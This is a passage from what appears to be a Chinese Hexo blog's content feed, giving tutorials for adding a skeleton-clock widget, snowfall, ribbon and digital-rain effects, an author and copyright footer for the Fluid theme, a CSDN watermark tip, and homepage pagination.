code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--人体时钟背景透明--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;Shift_JIS&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://chabudai.sakura.ne.jp/blogparts/honehoneclock/honehone_clock_tr.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--人体时钟背景白--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;Shift_JIS&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://chabudai.sakura.ne.jp/blogparts/honehoneclock/honehone_clock_wh.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>其他网页小挂件推荐：</p><p><a href="http://abowman.com/">http://abowman.com/</a> 里面有很多有趣的小挂件，可以养养鱼、龟、狗、仓鼠等各式各样的虚拟宠物，能根据你的鼠标指针位置移动，直接复制代码就可以用<br><a href="http://www.revolvermaps.com/">http://www.revolvermaps.com/</a> 它提供网站访客地理信息，可以以2D、3D等形式显示<br><a href="http://www.amazingcounters.com/">http://www.amazingcounters.com/</a> 免费网站计数器，有非常多的样式供你选择，可以设置计数器初始数值，可以设置按访问量计数，也可以按独立访问者计数<br><a href="https://www.seniverse.com/widget/get">https://www.seniverse.com/widget/get</a> 心知天气提供基于Web的免费天气插件，可以为你的网站添加一项简洁美观的天气预报功能，并自动适配PC和手机上的浏览</p><h3 id="11-添加网站雪花飘落效果"><a href="#11-添加网站雪花飘落效果" class="headerlink" title="11.添加网站雪花飘落效果"></a>11.添加网站雪花飘落效果</h3><p>有样式一和样式二。<br>样式一是有形状的。样式二是一个模糊点。<br>实现方法：在 \Hexo\themes\hexo-theme-spfk\source\js 目录下新建一个 snow.js 文件，粘贴以下代码：<br>样式一代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">/*样式一*/<br>(function($)&#123;<br>$.fn.snow = function(options)&#123;<br>var $flake = $(&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;snowbox&quot;</span> /&gt;</span>&#x27;).css(&#123;&#x27;position&#x27;: &#x27;absolute&#x27;,&#x27;z-index&#x27;:&#x27;9999&#x27;, &#x27;top&#x27;: &#x27;-50px&#x27;&#125;).html(&#x27;<span class="hljs-symbol">&amp;#10052;</span>&#x27;),<br>documentHeight = $(document).height(),<br>documentWidth= $(document).width(),<br>defaults = &#123;<br>minSize: 10,<br>maxSize: 20,<br>newOn: 1000,<br>flakeColor: &quot;#AFDAEF&quot; /* 此处可以定义雪花颜色，若要白色可以改为#FFFFFF */<br>&#125;,<br>options= $.extend(&#123;&#125;, defaults, options);<br>var interval= setInterval( function()&#123;<br>var startPositionLeft = Math.random() * documentWidth - 100,<br>startOpacity = 0.5 + Math.random(),<br>sizeFlake = options.minSize + Math.random() * options.maxSize,<br>endPositionTop = documentHeight - 200,<br>endPositionLeft = startPositionLeft - 500 + Math.random() * 500,<br>durationFall = documentHeight * 10 + Math.random() * 5000;<br>$flake.clone().appendTo(&#x27;body&#x27;).css(&#123;<br>left: startPositionLeft,<br>opacity: startOpacity,<br>&#x27;font-size&#x27;: sizeFlake,<br>color: options.flakeColor<br>&#125;).animate(&#123;<br>top: endPositionTop,<br>left: endPositionLeft,<br>opacity: 0.2<br>&#125;,durationFall,&#x27;linear&#x27;,function()&#123;<br>$(this).remove()<br>&#125;);<br>&#125;, options.newOn);<br>    &#125;;<br>&#125;)(jQuery);<br>$(function()&#123;<br>    $.fn.snow(&#123; <br>    minSize: 5, /* 定义雪花最小尺寸 */<br>    maxSize: 50,/* 定义雪花最大尺寸 */<br>    newOn: 300  /* 定义密集程度，数字越小越密集 */<br>    &#125;);<br>&#125;);<br><br></code></pre></div></td></tr></table></figure><p>样式二代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">/*样式二*/<br>/* 控制下雪 */<br>function snowFall(snow) &#123;<br>    /* 可配置属性 */<br>    snow = snow || &#123;&#125;;<br>    this.maxFlake = snow.maxFlake || 200;   /* 最多片数 */<br>    this.flakeSize = snow.flakeSize || 10;  /* 雪花形状 */<br>    this.fallSpeed = snow.fallSpeed || 1;   /* 坠落速度 */<br>&#125;<br>/* 兼容写法 */<br>requestAnimationFrame = window.requestAnimationFrame ||<br>    window.mozRequestAnimationFrame ||<br>    window.webkitRequestAnimationFrame ||<br>    window.msRequestAnimationFrame ||<br>    window.oRequestAnimationFrame ||<br>    function(callback) &#123; setTimeout(callback, 1000 / 60); &#125;;<br><br>cancelAnimationFrame = window.cancelAnimationFrame ||<br>    window.mozCancelAnimationFrame ||<br>    window.webkitCancelAnimationFrame ||<br>    window.msCancelAnimationFrame ||<br>window.oCancelAnimationFrame;<br>/* 开始下雪 */<br>snowFall.prototype.start = function()&#123;<br>    /* 创建画布 */<br>    snowCanvas.apply(this);<br>    /* 创建雪花形状 */<br>    createFlakes.apply(this);<br>    /* 画雪 */<br>    drawSnow.apply(this)<br>&#125;<br>/* 创建画布 */<br>function snowCanvas() &#123;<br>    /* 添加Dom结点 */<br>    var snowcanvas = document.createElement(&quot;canvas&quot;);<br>    snowcanvas.id = &quot;snowfall&quot;;<br>    snowcanvas.width = window.innerWidth;<br>    snowcanvas.height = document.body.clientHeight;<br>    snowcanvas.setAttribute(&quot;style&quot;, &quot;position:absolute; top: 0; left: 0; z-index: 1; pointer-events: none;&quot;);<br>    document.getElementsByTagName(&quot;body&quot;)[0].appendChild(snowcanvas);<br>    this.canvas = snowcanvas;<br>    this.ctx = snowcanvas.getContext(&quot;2d&quot;);<br>    /* 窗口大小改变的处理 */<br>    window.onresize = function() &#123;<br>        snowcanvas.width = window.innerWidth;<br>        /* snowcanvas.height = window.innerHeight */<br>    &#125;<br>&#125;<br>/* 雪运动对象 */<br>function flakeMove(canvasWidth, canvasHeight, flakeSize, fallSpeed) &#123;<br>    this.x = Math.floor(Math.random() * canvasWidth);   /* x坐标 */<br>    this.y = Math.floor(Math.random() * canvasHeight);  /* y坐标 */<br>    this.size = Math.random() * flakeSize + 2;          /* 形状 */<br>    this.maxSize = flakeSize;                           /* 最大形状 */<br>    this.speed = Math.random() * 1 + fallSpeed;         /* 坠落速度 */<br>    this.fallSpeed = fallSpeed;                         /* 坠落速度 */<br>    this.velY = this.speed;                             /* Y方向速度 */<br>    this.velX = 0;                                      /* X方向速度 */<br>    this.stepSize = Math.random() / 30;                 /* 步长 */<br>    this.step = 0                                       /* 步数 */<br>&#125;<br>flakeMove.prototype.update = function() &#123;<br>    var x = this.x,<br>        y = this.y;<br>    /* 左右摆动(余弦) */<br>    this.velX *= 0.98;<br>    if (this.velY &lt;= this.speed) &#123;<br>        this.velY = this.speed<br>    &#125;<br>    this.velX += Math.cos(this.step += .05) * this.stepSize;<br><br>    this.y += this.velY;<br>    this.x += this.velX;<br>    /* 飞出边界的处理 */<br>    if (this.x &gt;= canvas.width || this.x &lt;= 0 || this.y &gt;= canvas.height || this.y &lt;= 0) &#123;<br>        this.reset(canvas.width, canvas.height)<br>    &#125;<br>&#125;;<br>/* 飞出边界-放置最顶端继续坠落 */<br>flakeMove.prototype.reset = function(width, height) &#123;<br>    this.x = Math.floor(Math.random() * width);<br>    this.y = 0;<br>    this.size = Math.random() * this.maxSize + 2;<br>    this.speed = Math.random() * 1 + this.fallSpeed;<br>    this.velY = this.speed;<br>    this.velX = 0;<br>&#125;;<br>// 渲染雪花-随机形状（此处可修改雪花颜色！！！）<br>flakeMove.prototype.render = function(ctx) &#123;<br>    var snowFlake = ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.size);<br>    snowFlake.addColorStop(0, &quot;rgba(255, 255, 255, 0.9)&quot;);  /* 此处是雪花颜色，默认是白色 */<br>    snowFlake.addColorStop(.5, &quot;rgba(255, 255, 255, 0.5)&quot;); /* 若要改为其他颜色，请自行查 */<br>    snowFlake.addColorStop(1, &quot;rgba(255, 255, 255, 0)&quot;);    /* 找16进制的RGB 颜色代码。 */<br>    ctx.save();<br>    ctx.fillStyle = snowFlake;<br>    ctx.beginPath();<br>    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);<br>    ctx.fill();<br>    ctx.restore();<br>&#125;;<br>/* 创建雪花-定义形状 */<br>function createFlakes() &#123;<br>    var maxFlake = this.maxFlake,<br>        flakes = this.flakes = [],<br>        canvas = this.canvas;<br>    for (var i = 0; i &lt; maxFlake; i++) &#123;<br>        flakes.push(new flakeMove(canvas.width, canvas.height, this.flakeSize, this.fallSpeed))<br>    &#125;<br>&#125;<br>/* 画雪 */<br>function drawSnow() &#123;<br>    var maxFlake = this.maxFlake,<br>        flakes = this.flakes;<br>    ctx = this.ctx, canvas = this.canvas, that = this;<br>    /* 清空雪花 */<br>    ctx.clearRect(0, 0, canvas.width, canvas.height);<br>    for (var e = 0; e &lt; maxFlake; e++) &#123;<br>        flakes[e].update();<br>        flakes[e].render(ctx);<br>    &#125;<br>    /*  一帧一帧的画 */<br>    this.loop = requestAnimationFrame(function() &#123;<br>        drawSnow.apply(that);<br>    &#125;);<br>&#125;<br>/* 调用及控制方法 */<br>var snow = new snowFall(&#123;maxFlake:60&#125;);<br>snow.start();<br><br></code></pre></div></td></tr></table></figure><p>然后在 \Hexo\themes\hexo-theme-spfk\layout\layout.ejs 文件里引用即可：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 雪花特效 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;\js\snow.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>如果没效果，请确认网页是否已载入JQurey，如果没有请在下雪代码之前引入JQ即可：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://libs.baidu.com/jquery/1.8.3/jquery.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://libs.baidu.com/jquery/1.8.3/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><h3 id="12-添加背景动态彩带效果"><a href="#12-添加背景动态彩带效果" class="headerlink" title="12.添加背景动态彩带效果"></a>12.添加背景动态彩带效果</h3><p>样式一是鼠标点击后彩带自动更换样式，样式二是飘动的彩带.<br>实现方法：在 \themes\material-x\layout\layout.ejs 文件的body前面添加如下代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 样式一（鼠标点击更换样式） --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://g.joyinshare.com/hc/ribbon.min.js&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 样式二（飘动的彩带） --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://g.joyinshare.com/hc/piao.js&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><h3 id="13-添加背景代码雨效果"><a href="#13-添加背景代码雨效果" class="headerlink" title="13.添加背景代码雨效果"></a>13.添加背景代码雨效果</h3><p>新建 DigitalRain.js，写入以下代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">window.onload = function()&#123;<br>    //获取画布对象<br>    var canvas = document.getElementById(&quot;canvas&quot;);<br>    //获取画布的上下文<br>    var context =canvas.getContext(&quot;2d&quot;);<br>    var s = window.screen;<br>    var W = canvas.width = s.width;<br>    var H = canvas.height;<br>    //获取浏览器屏幕的宽度和高度<br>    //var W = window.innerWidth;<br>    //var H = window.innerHeight;<br>    //设置canvas的宽度和高度<br>    canvas.width = W;<br>    canvas.height = H;<br>    //每个文字的字体大小<br>    var fontSize = 12;<br>    //计算列<br>    var colunms = Math.floor(W /fontSize);<br>    //记录每列文字的y轴坐标<br>    var drops = [];<br>    //给每一个文字初始化一个起始点的位置<br>    for(var i=0;i&lt;colunms;i++)&#123;<br>        drops.push(0);<br>    &#125;<br>    //运动的文字<br>    var str =&quot;WELCOME TO WWW.ITRHX.COM&quot;;<br>    //4:fillText(str,x,y);原理就是去更改y的坐标位置<br>    //绘画的函数<br>    function draw()&#123;<br>        context.fillStyle = &quot;rgba(238,238,238,.08)&quot;;//遮盖层<br>        context.fillRect(0,0,W,H);<br>        //给字体设置样式<br>        context.font = &quot;600 &quot;+fontSize+&quot;px  Georgia&quot;;<br>        //给字体添加颜色<br>        context.fillStyle = [&quot;#33B5E5&quot;, &quot;#0099CC&quot;, &quot;#AA66CC&quot;, &quot;#9933CC&quot;, &quot;#99CC00&quot;, &quot;#669900&quot;, &quot;#FFBB33&quot;, &quot;#FF8800&quot;, &quot;#FF4444&quot;, &quot;#CC0000&quot;][parseInt(Math.random() * 10)];//randColor();可以rgb,hsl, 标准色，十六进制颜色<br>        //写入画布中<br>        for(var i=0;i&lt;colunms;i++)&#123;<br>            var index = Math.floor(Math.random() * str.length);<br>            var x = i*fontSize;<br>            var y = drops[i] *fontSize;<br>            context.fillText(str[index],x,y);<br>            //如果要改变时间，肯定就是改变每次他的起点<br>            if(y &gt;= canvas.height &amp;&amp; Math.random() &gt; 0.99)&#123;<br>                drops[i] = 0;<br>            &#125;<br>            drops[i]++;<br>        &#125;<br>    &#125;;<br>    function randColor()&#123;//随机颜色<br>        var r = Math.floor(Math.random() * 256);<br>        var g = Math.floor(Math.random() * 256);<br>        var b = Math.floor(Math.random() * 256);<br>        return &quot;rgb(&quot;+r+&quot;,&quot;+g+&quot;,&quot;+b+&quot;)&quot;;<br>    &#125;<br>    draw();<br>    setInterval(draw,35);<br>&#125;;<br><br></code></pre></div></td></tr></table></figure><p>在主题文件的相关css文件中（以 Material X 1.2.1 主题为例，在\themes\material-x-1.2.1\source\less_main.less 文件末尾）添加以下代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">canvas &#123;<br>  position: fixed;<br>  right: 0px;<br>  bottom: 0px;<br>  min-width: 100%;<br>  min-height: 100%;<br>  height: auto;<br>  width: auto;<br>  z-index: -1;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>然后在主题的 layout.ejs 文件中引入即可：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 数字雨 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;canvas&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1440&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;900&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/DigitalRain.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>之后就可以看见效果了。</p>]]></content>
    
    
    <categories>
      
      <category>学习教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo-Fluid主题-文章末尾添加作者和版权声明等</title>
    <link href="/2021/04/07/hexo-Fluid%E4%B8%BB%E9%A2%98-%E6%96%87%E7%AB%A0%E6%9C%AB%E5%B0%BE%E6%B7%BB%E5%8A%A0%E4%BD%9C%E8%80%85%E5%92%8C%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E%E7%AD%89/"/>
    <url>/2021/04/07/hexo-Fluid%E4%B8%BB%E9%A2%98-%E6%96%87%E7%AB%A0%E6%9C%AB%E5%B0%BE%E6%B7%BB%E5%8A%A0%E4%BD%9C%E8%80%85%E5%92%8C%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E%E7%AD%89/</url>
    
    <content type="html"><![CDATA[<p>hexo-Fluid主题中，在文章的末尾添加作者、版权声明和本文链接。</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">打开 themes\fluid\layout 中的 post.ejs 文件； 即打开fluid主题里面的文件<br></code></pre></div></td></tr></table></figure><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">找到以下内容并进行修改；<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210407224015302.png"><br>将红色部分替换为以下代码：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">   &lt;% <span class="hljs-keyword">if</span>(theme.post.copyright.enable &amp;&amp; theme.post.copyright.content &amp;&amp; page.copyright !== <span class="hljs-literal">false</span>) &#123; %&gt;&lt;p class=<span class="hljs-string">&quot;note note-warning&quot;</span>&gt;<br>&lt;strong&gt;本文作者: &lt;/strong&gt;&lt;a href=<span class="hljs-string">&quot;&lt;%- url_for() %&gt;&quot;</span>&gt;&lt;%- theme.about.name || config.author || config.title %&gt;&lt;/a&gt; &lt;br&gt;<br>&lt;strong&gt;本文链接: &lt;/strong&gt;&lt;a href=<span class="hljs-string">&quot;&lt;%- full_url_for(page.path) %&gt;&quot;</span>&gt;&lt;%-   full_url_for(page.path) %&gt;&lt;/a&gt; &lt;br&gt;<br>&lt;strong&gt;版权声明: &lt;/strong&gt;&lt;%- theme.post.copyright.content %&gt;<br>   &lt;/p&gt;<br>   &lt;% &#125; %&gt;<br></code></pre></div></td></tr></table></figure><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">保存文本，重启本地预览即可。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSDN图片一招除去水印</title>
    <link href="/2021/04/07/CSDN%E5%9B%BE%E7%89%87%E4%B8%80%E6%8B%9B%E9%99%A4%E5%8E%BB%E6%B0%B4%E5%8D%B0/"/>
    <url>/2021/04/07/CSDN%E5%9B%BE%E7%89%87%E4%B8%80%E6%8B%9B%E9%99%A4%E5%8E%BB%E6%B0%B4%E5%8D%B0/</url>
    
    <content type="html"><![CDATA[<p>在CSDN上发布文章时，自己发的图片会产生一个水印，水印可能会挡住一些内容。简单一招除去水印。</p><hr><h6 id="在上传图片时，删除-问号-后面的所有代码即可。如图。"><a href="#在上传图片时，删除-问号-后面的所有代码即可。如图。" class="headerlink" title="在上传图片时，删除 问号(?)后面的所有代码即可。如图。"></a>在上传图片时，删除 问号(?)后面的所有代码即可。如图。</h6><p><img src="https://img-blog.csdnimg.cn/20210407202840792.png"></p>]]></content>
    
    
    <categories>
      
      <category>实用小技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo-Fluid主题-博客首页文章分页实现</title>
    <link href="/2021/04/07/hexo-Fluid%E4%B8%BB%E9%A2%98-%E5%8D%9A%E5%AE%A2%E9%A6%96%E9%A1%B5%E6%96%87%E7%AB%A0%E5%88%86%E9%A1%B5%E5%AE%9E%E7%8E%B0/"/>
    <url>/2021/04/07/hexo-Fluid%E4%B8%BB%E9%A2%98-%E5%8D%9A%E5%AE%A2%E9%A6%96%E9%A1%B5%E6%96%87%E7%AB%A0%E5%88%86%E9%A1%B5%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h5 id="hexo博客首页文章分页实现。"><a href="#hexo博客首页文章分页实现。" class="headerlink" title="hexo博客首页文章分页实现。"></a>hexo博客首页文章分页实现。</h5><hr><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">在搭建完Hexo + Github pages的博客后，会发现他的主页会默认显示很多的文章（默认10篇），而我们也许需要自定义分页进行管理主页博客的显示数量。<br></code></pre></div></td></tr></table></figure><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1.首先我们找到Hexo的根配置文件_config.yml，注意不是主题(themes)中的配置文件。<br></code></pre></div></td></tr></table></figure><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">2.找到 index_generator 中的 per_page 。然后修改后面的数即可。如下图。<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210407201120414.png"></p><h3 id="第三步"><a href="#第三步" class="headerlink" 